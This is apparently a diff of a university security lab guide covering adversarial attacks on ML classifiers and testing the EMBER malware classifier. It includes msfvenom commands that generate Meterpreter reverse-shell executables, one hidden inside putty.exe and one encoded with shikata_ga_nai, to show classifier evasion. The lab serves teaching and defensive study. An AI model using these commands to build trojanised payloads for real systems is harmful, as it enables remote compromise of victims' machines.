@@ -12,10 +12,19 @@ To see how this works, we can use a program that uses what is called a non-targe
 
 Start the docker container as follows:
 
+{% tabs %}
+{% tab title="Windows/Apple Intel" %}
 ```bash
-/ai/share$ docker run -v /projects/share:/opt/adversarial/share -it cybernemosyne/cits1003:ai 
-root@453e8234c9fd:/# 
+docker run -v /projects/share:/opt/adversarial/share -it cybernemosyne/cits1003:ai
 ```
+{% endtab %}
+
+{% tab title="Apple Silicon" %}
+```
+docker run -v /projects/share:/opt/adversarial/share -it cybernemosyne/cits1003:ai-x
+```
+{% endtab %}
+{% endtabs %}
 
 The -v flag will allow you to share a local directory with the container which we are going to use to get image files. So use a local directory with nothing in it.
 
@@ -24,7 +33,7 @@ Once on the docker container, go to the directory /opt/adversarial/share. From t
 To run the script we do so as follows:
 
 ```bash
-/share# python ../exploit.py ../lab_og.jpg 
+/share# python exploit.py lab_og.jpg 
 2021-07-11 12:35:07.359638: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcudart.so.11.0'; dlerror: libcudart.so.11.0: cannot open shared object file: No such file or directory
 2021-07-11 12:35:07.359708: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
 2021-07-11 12:35:08.344216: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
@@ -102,7 +111,7 @@ To test the model cd on the same docker container to the directory /opt/ember. T
 To test the malware, we can use the following command:
 
 ```bash
-/opt/ember# python scripts/classify_binaries.py -m ./dataset/ember_model_2018.txt malware 
+/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt malware 
 WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
 WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
 WARNING:   in the feature calculations.
@@ -122,7 +131,7 @@ The malware is actually Emotet, which is a banking trojan.
 We can now try with a normal Windows program git.exe
 
 ```bash
-root@3432bc8b6c77:/opt/ember# python scripts/classify_binaries.py -m ./dataset/ember_model_2018.txt git.exe 
+root@3432bc8b6c77:/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt git.exe 
 WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
 WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
 WARNING:   in the feature calculations.
@@ -151,16 +160,34 @@ Msfvenom comes with a variety of evasion techniques to avoid detection but most 
 
 To get started, we are going to run Metasploit, and to do this we will run a Docker container in a separate terminal/cmd window as follows:
 
+{% tabs %}
+{% tab title="Windows/Apple Intel" %}
 ```bash
-docker run -v $(pwd)/share:/opt/share -it  metasploitframework/metasploit-framework:latest
+docker run -v $(pwd)/share:/opt/share -it heywoodlh/metasploit
 ```
+{% endtab %}
+
+{% tab title="Apple Silicon" %}
+```
+docker run -v $(pwd)/share:/opt/share -it heywoodlh/metasploit
+
+```
+{% endtab %}
+{% endtabs %}
 
 Instead of $\(pwd\) put the same local folder you were running for the AI container above.
 
-You should see something like this:
+Once this is running, you can type
 
 ```bash
-0x4447734D4250:~/Desktop/DevProjects/cits1003/Images/ai$ docker run -v $(pwd)/share:/opt/share -it  metasploitframework/metasploit-framework:latest
+msfconsole
+```
+
+and answer yes to the following question and no to the second.
+
+After doing that, you should see something like this:
+
+```bash
 [!] The following modules could not be loaded!..\
 [!] 	/usr/src/metasploit-framework/modules/auxiliary/gather/office365userenum.py
 [!] Please see /home/msf/.msf4/logs/framework.log for details.
@@ -213,16 +240,16 @@ msf6 >
 
 The graphic changes each time you load it so don't worry if your version doesn't show Missile Command - and in case you were wondering - Missile Command was a very popular video game back in the 1980's :\) \).
 
-At the command prompt change directory to /opt/share. We are going to need a file called putty.exe that we are going to use as a template for one of the Meterpreter versions and so download it now:
+We are going to need a file called putty.exe that we are going to use as a template for one of the Meterpreter versions and so download it now to the directory you have shared with the container:
 
 ```bash
-wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
+https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
 ```
 
 We are going to run msfvenom from the Metasploit command line to generate two versions of meterpreter executables. The first will run an unmodified meterpreter executable:
 
 ```bash
-/usr/src/metasploit-framework/msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe > meterpreter1.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe > /opt/share/meterpreter1.exe
 ```
 
 You don't really have to worry about the parameters but if you are interested, the LHOST and LPORT arguments tell Meterpreter where to connect back to i.e. our machine. The -f exe tells Meterpreter that we are using an executable format for the payload.
@@ -230,7 +257,7 @@ You don't really have to worry about the parameters but if you are interested, t
 Now we will create a second version that will effectively embed Meterpreter in a normal Windows executable putty.exe. Putty is an application that allows SSH connections on a Windows box. Run the msfvenom command as follows:
 
 ```bash
-/usr/src/metasploit-framework/msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -x putty.exe > meterpreter2.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -x /opt/share/putty.exe > /opt/share/meterpreter2.exe
 ```
 
 Now that we have the two samples, we can go back to our classifier and see what happens:
@@ -263,7 +290,7 @@ So, according to the classifier, this is a normal, and safe, binary!
 Msfvenom has other encoders that try and obfuscate the file to avoid detection. One of these is called shikata ga nai. You can create a meterpreter binary using the flag
 
 ```bash
-/usr/src/metasploit-framework/msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -e shikata_ga_nai > meterpreter3.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -e shikata_ga_nai > /opt/share/meterpreter3.exe
 ```
 
 However, when you classify this one, you will see that it is still recognised as malware.
